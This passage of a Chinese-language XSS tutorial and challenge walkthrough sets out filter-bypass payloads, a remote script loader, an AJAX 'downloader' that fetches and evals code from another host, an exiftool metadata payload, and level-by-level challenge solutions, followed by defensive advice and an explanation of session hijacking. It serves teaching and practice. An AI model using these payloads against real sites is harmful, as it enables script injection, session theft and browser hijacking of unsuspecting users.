<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;./smile.jpg&#x27;</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span>  	// 标签引入一张图片，鼠标悬停于图片上时会触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onkeydown</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>			// 当点击键盘任意一个键时触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>					// 当图片未找到时触发XSS代码</span><br></pre></td></tr></table></figure>

<h2 id="利用CSS跨站-了解"><a href="#利用CSS跨站-了解" class="headerlink" title="利用CSS跨站(了解)"></a>利用CSS跨站(了解)</h2><p>可以利用CSS（层叠样式脚本）触发XSS。但方法古老，基本不适用，从学习角度了解。以下代码均在IE6下测试。</p>
<ul>
<li>行内样式<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-image: url(javascript:alert(/xss/))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>页内样式<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-tag">Body</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">javascript:alert(/xss</span>))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>外部样式<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./xss.css&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="其它标签以及手法"><a href="#其它标签以及手法" class="headerlink" title="其它标签以及手法"></a>其它标签以及手法</h2><p>可以使用其它标签触发XSS，比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>						载入页面时自动触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(/xss/)&quot;</span> <span class="attr">autofocus</span>&gt;</span>		当鼠标放在目标上时，自动聚焦并触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">οnlοad</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">1</span>  <span class="attr">οnerrοr</span>=<span class="string">alert(hack)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">οnlοadstart</span>=<span class="string">alert(1)</span> <span class="attr">src</span>=<span class="string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">οnlοad</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="XSS的变形"><a href="#XSS的变形" class="headerlink" title="XSS的变形"></a>XSS的变形</h1><p>可以将构造的XSS代码进行各种变形，以绕过XSS过滤器的检测。</p>
<h2 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h2><p>将payload进行大小写转换。但需要注意，只能对其中的HTML代码进行大小写转换，因为JS代码对大小写敏感。比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span> /&gt;</span> 				不能对alert进行大小写转换，因为是JS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;javaScript:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="引号的使用"><a href="#引号的使用" class="headerlink" title="引号的使用"></a>引号的使用</h2><p>HTML 语言对引号不敏感，但某些过滤函数敏感。因此不同过滤情况需要考虑使用单&#x2F;双引号或不使用引号。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)/</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="代替空格"><a href="#代替空格" class="headerlink" title="代替空格"></a>代替空格</h2><p>可以利用 <code>/  //  %0a  %0d  Table键</code> 代替空格</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;Img/sRc=&#x27;#&#x27;/Onerror=&#x27;alert(/xss/)&#x27;/&gt;</span><br></pre></td></tr></table></figure>

<h2 id="回车"><a href="#回车" class="headerlink" title="回车"></a>回车</h2><p>可以在一些位置添加Tab(水平制表符)和回车符，来绕过关键字检测。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>	=<span class="string">&quot;alert(/xss/)&quot;</span> /&gt;</span> 		// 不能强行打断Onerror</span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">hREf</span>=<span class="string">&quot;j</span></span></span><br><span class="line"><span class="string"><span class="tag">a	v</span></span></span><br><span class="line"><span class="string"><span class="tag">a 	s</span></span></span><br><span class="line"><span class="string"><span class="tag">cript:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h2><p>可以对标签属性值进行转码，用来绕过过滤。对应编码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字母 	ASCII码 		十进制编码 	十六进制编码</span><br><span class="line">a 		97			&amp;#97; 		&amp;#x61;</span><br><span class="line">e 		101			&amp;#101; 		&amp;#x65;</span><br></pre></td></tr></table></figure>
<p>简单编码后的示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#61;</span>Script:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>另外，可以将以下字符插入到任意位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tab 	&amp;#9</span><br><span class="line">换行 	&amp;#10</span><br><span class="line">回车 	&amp;#13</span><br></pre></td></tr></table></figure>
<p>可以将以下字符插入到头部位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SOH 	&amp;#01</span><br><span class="line">STX 	&amp;#02</span><br></pre></td></tr></table></figure>
<p>简单编码后的示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;<span class="symbol">&amp;#01;</span>j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#61;</span>S<span class="symbol">&amp;#9;</span>c<span class="symbol">&amp;#10;</span>r<span class="symbol">&amp;#13;</span>ipt:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="拆分跨站"><a href="#拆分跨站" class="headerlink" title="拆分跨站"></a>拆分跨站</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=<span class="string">&#x27;alert&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=z+<span class="string">&#x27;(/xss/)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt; 	一次过滤的双写绕过</span><br></pre></td></tr></table></figure>

<h2 id="编码脚本代码绕过关键字过滤"><a href="#编码脚本代码绕过关键字过滤" class="headerlink" title="编码脚本代码绕过关键字过滤"></a>编码脚本代码绕过关键字过滤</h2><p>有时服务器往往会对代码中的关键字（如alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval（）来实现。eval()会将编码过的语句解码后再执行。还有许多其它编码（URL，Base64,HTML等）可以尝试。<br>例如alert(1)使用unicode编码过后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(\u0061\u006c\u0065\u0072\u0074(1))</span><br></pre></td></tr></table></figure>

<h2 id="CSS中的变形"><a href="#CSS中的变形" class="headerlink" title="CSS中的变形"></a>CSS中的变形</h2><ul>
<li>使用全角字符<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">width</span>:e x p r e s s i o <span class="built_in">n</span>(<span class="built_in">alert</span>(/xss/))</span><br></pre></td></tr></table></figure></li>
<li>注释会被浏览器忽略<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">width</span>:expr<span class="comment">/*~*/</span><span class="built_in">ession</span>(<span class="built_in">alert</span>(/x~s~s/))</span><br></pre></td></tr></table></figure></li>
<li>样式表中的 <code>\</code> 和 <code>\0</code><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;<span class="keyword">@import</span> <span class="string">&#x27;javasc\ri\0pt:alert(&quot;xss&quot;)&#x27;</span>;&lt;/style&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="Shellcode-的调用"><a href="#Shellcode-的调用" class="headerlink" title="Shellcode 的调用"></a>Shellcode 的调用</h1><p>shellcode就是在利用漏洞所执行的代码<br>完整的XSS攻击，会将shellcode存放在一定的地方，然后触发漏洞，调用shellcode</p>
<h2 id="远程调用JS"><a href="#远程调用JS" class="headerlink" title="远程调用JS"></a>远程调用JS</h2><p>可以将JS代码单独放在一个js文件中，然后通过http协议远程加载该脚本。如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://172.16.132.138/XSS-TEST/normal/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是比较常用的方式。xss.js的内容如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="windows-location-hash"><a href="#windows-location-hash" class="headerlink" title="windows.location.hash"></a>windows.location.hash</h2><p>可以使用js中的windows.location.hash 方法获取浏览器URL地址栏的XSS代码。类似于DOM型XSS，不容易被WAF检测到。<br>windows.location.hash会获取URL中的 <code>#</code> 后面的内容，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://domain.com/index.php#AJEST    windows.location.hash的值就是#AJEST</span><br></pre></td></tr></table></figure>
<p>所以可以构造如下代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?submit=submit&amp;xsscode=&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#alert(/This is windows.location.hash/)</span><br></pre></td></tr></table></figure>
<p>直接提交到测试页面xss.php</p>
<h2 id="XSS-Downloader"><a href="#XSS-Downloader" class="headerlink" title="XSS Downloader"></a>XSS Downloader</h2><h3 id="XSS下载器"><a href="#XSS下载器" class="headerlink" title="XSS下载器"></a>XSS下载器</h3><p>XSS下载器就是将XSS代码写到网页中，然后通过AJAX技术，取得网页中的XSS代码。<br>在使用XSS Downloader之前我们需要准备一个自己的页面，xss_downloader.php，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~~~~BOF|alert(/xss/)|EOF~~~~ 		其中~表示前后的代码，BOF和EOF是作为定位使用，中间放置XSS代码</span><br></pre></td></tr></table></figure>
<p>常见的下载器如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">XSS</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		a = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		a = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span>;&#125;</span></span><br><span class="line"><span class="language-javascript">	a.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://172.16.132.138/XSS-TEST/normal/xss_downloader.php&#x27;</span>,<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">	a.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">	b=a.<span class="property">responseText</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="built_in">eval</span>(<span class="built_in">unescape</span>(b.<span class="title function_">substring</span>(b.<span class="title function_">indexOf</span>(<span class="string">&#x27;BOF|&#x27;</span>)+<span class="number">4</span>,b.<span class="title function_">indexOf</span>(<span class="string">&#x27;EOF|&#x27;</span>))));</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">XSS</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="AJAX-技术的同源策略限制"><a href="#AJAX-技术的同源策略限制" class="headerlink" title="AJAX 技术的同源策略限制"></a>AJAX 技术的同源策略限制</h3><p>AJAX 技术会受到浏览器同源策略的限制，为了解决这个问题，我们需要在服务器端代码中添加如下内容：<br>在XSS Downloader前加上</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin:*&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Headers:Origin, X-Requested-With, Content-Type, Accept&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可实现跨域访问</p>
<h2 id="备选存储技术"><a href="#备选存储技术" class="headerlink" title="备选存储技术"></a>备选存储技术</h2><p>可以把Shellcode存储存储在客户端的本地域中，比如HTTP Cookie，Flash共享对象，UserData，localStorage等。这里以HTTP Cookie为例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;.xss.php&#x27; target=&#x27;_blank&#x27;&gt;Cookie -XSS 验证&lt;/a&gt;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;设置Cookie失败&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击Cookie-XSS验证，即可产生弹窗</p>
<h1 id="靶场训练"><a href="#靶场训练" class="headerlink" title="靶场训练"></a>靶场训练</h1><p>这里使用的是该靶场<a href="http://test.ctf8.com/">XSS Challenges</a><br>简单过一遍~</p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>直接在url处输入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>按level 1 的方法无法成功，于是观察源代码。发现需要闭合标签。我们需要自己构造：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>尝试使用上一关的注入手法，发现左右尖括号被过滤，于是我们选择不需要尖括号的方式，使用事件闭合单引号：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>和上一关原理相同，只不过换成了双引号：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>本关用下划线把on和script分开：o_n, scr_ipt<br>所以我们需要更换标签，使用a标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(/xss/)XSS</span>&lt;/<span class="attr">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>本关也用下划线把href分开：hr_ef<br>我们尝试大小写绕过，发现成功：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>本关输入后，发现href和script都消失了，因此我们判断是进行了一次过滤，那么方案即为双写绕过：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hrhrefef</span>=<span class="string">&quot;javascrscriptipt:alert(/xss/)&quot;</span>&gt;</span>touch me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>本关是添加一个链接，通过源代码可知是将代码写到href里，但写入javascript:alert(&#x2F;xss&#x2F;)后发现script变成了scr ipt，<br>于是我们尝试在script之间加一个TAB键，用编码后的格式插入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascr&amp;#9ipt:alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>无论如何注入，点开源代码，发现都显示链接不合法，那么我们思考是不是检测了http:&#x2F;&#x2F; 于是尝试构造含有http:&#x2F;&#x2F; 的XSS代码，发现成功：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascr&amp;#9ipt:alert(/xss/)//http://</span><br></pre></td></tr></table></figure>

<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>这一关查看源代码，发现正常显示位置keyword进行了严格过滤，但我们发现源代码中有三个type为hidden的隐藏参数，注入尝试，发现只有t_sort是有效的，因此我们通过t_sort注入XSS代码，把type改为text等能够显示的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>这一关源代码中出现了这样的语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;http://test.ctf8.com/level10.php?keyword=1&amp;t_sort=%22%20type=%22text%22%20onmouseover=%22alert(/xss/)&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>t_ref这个值就是http请求中的referer，所以抓包改包<br>如果没有Referer，直接自己添加一个，输入以下值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer:&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>只不过是变成了user-agent，XSS注入手法一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user-agent:&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>只不过是变成了cookie，XSS注入手法一样，按下F12，点击存储-&gt;Cookie-&gt;user，将值改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>exif 题目失效,图片加载不出来<br>漏洞成因：chrome插件exif viewer获取图片exif信息时没有进行过滤，导致xss代码执行。<br>exif xss，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的exif元数据被修改为xss payload，成功利用弹窗，具体实现使用kali下的exiftool工具，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exiftool -FIELD=XSS FILE</span><br><span class="line">exiftool -Artist=&#x27; &quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&#x27; brute.jpeg</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于网址失效，从14关之后都无法做了，后面的通关方法可以看看这个博客：<br><a href="http://zhuabapa.top/2019/12/10/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/">XSS挑战之旅</a></p>
<h1 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h1><h2 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h2><p>XSS Filter 的作用是过滤用户(客户端)提交的有害信息，从而达到防范XSS攻击的效果</p>
<h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>“永远不要相信用户的输入”是网站开发的基本常识，对于用户输入一定要严格过滤。</p>
<h3 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h3><p>简单的说，输入验证就是对用户提交的信息进行有效验证，仅接收指定长度范围内的数据，采用适当格式的内容提交，阻止或忽略除此之外的任何其它数据。</p>
<ul>
<li>输入是否仅包含合法字符</li>
<li>输入字符串是否超过最大长度限制</li>
<li>输入如果含有数字，数字是否在指定范围内</li>
<li>输入是否符合特殊格式要求，如E-mail地址，IP地址等</li>
</ul>
<h3 id="数据消毒"><a href="#数据消毒" class="headerlink" title="数据消毒"></a>数据消毒</h3><p>过滤和净化掉有害输入</p>
<h3 id="输出编码"><a href="#输出编码" class="headerlink" title="输出编码"></a>输出编码</h3><p>HTML编码主要是用对应的HTML实体代替字符，比如<code>&lt; &gt; &quot; &#39;</code></p>
<h3 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h3><p>不管用输入过滤还是输出编码，都针对数据信息进行黑|白名单式的过滤</p>
<ul>
<li>黑名单：非允许数据</li>
<li>白名单：允许的数据</li>
</ul>
<h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM-XSS"></a>DOM-XSS</h2><p>避免客户端文档重写，重定向或其它敏感操作。</p>
<h1 id="XSS工具"><a href="#XSS工具" class="headerlink" title="XSS工具"></a>XSS工具</h1><h2 id="beEF"><a href="#beEF" class="headerlink" title="beEF"></a>beEF</h2><p>XSS 漏洞利用平台<br>启动在kali中<br>工具目录 <code>/usr/share/beef-xss</code><br>配置文件 <code>config.yaml</code><br>修改默认用户名和密码</p>
<h1 id="利用案例"><a href="#利用案例" class="headerlink" title="利用案例"></a>利用案例</h1><h2 id="浏览器劫持"><a href="#浏览器劫持" class="headerlink" title="浏览器劫持"></a>浏览器劫持</h2><ul>
<li>从软件方面来说，它是一种恶意程序，通过DLL插件、BHO、WinsockLSP等形式对用户的浏览器进行篡改，使用户浏览器出现访问正常网站时被转向到恶意网页、IE浏览器主页&#x2F;搜索页等被修改为劫持软件指定的网站地址等异常情况。</li>
<li>从技术方面来说，它是一种常见的在线攻击类型，黑客可通过这种方式控制的计算机的浏览器，并更改网上冲浪的方式和冲浪时所显示的内容。</li>
<li>“浏览器劫持”，通俗点说就是故意误导浏览器行进路线的一种现象。</li>
</ul>
<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>会话劫持（Session hijacking），这是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户，因此需要保证会话标识不被泄漏。</p>
<h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><ol>
<li>目标用户需要先登录站点；</li>
<li>登录成功后，该用户会得到站点提供的一个会话标识SessionID；</li>
<li>攻击者通过某种攻击手段捕获Session ID；攻击者获取SessionID的方式有多种：</li>
</ol>
<ul>
<li>暴力破解：尝试各种Session ID，直到破解为止；</li>
<li>预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来；</li>
<li>窃取：使用网络嗅探，XSS攻击等方法获得。</li>
</ul>
<ol start="4">
<li>攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话。</li>
</ol>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ul>
<li>更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。</li>
<li>关闭透明化Session ID。透明化Session ID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。</li>
<li>设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。</li>
<li>关闭所有phpinfo类dump request信息的页面。</li>
<li>验证HTTP头部信息。</li>
<li>加入Token校验。同样是用于检测请求的一致性，给攻击者制造一些麻烦，使攻击者即使获取了Session ID，也无法进行破坏，能够减少对系统造成的损失。但Token需要存放在客户端，如果攻击者有办法获取到Session ID，那么也同样可以获取到Token。</li>
</ul>
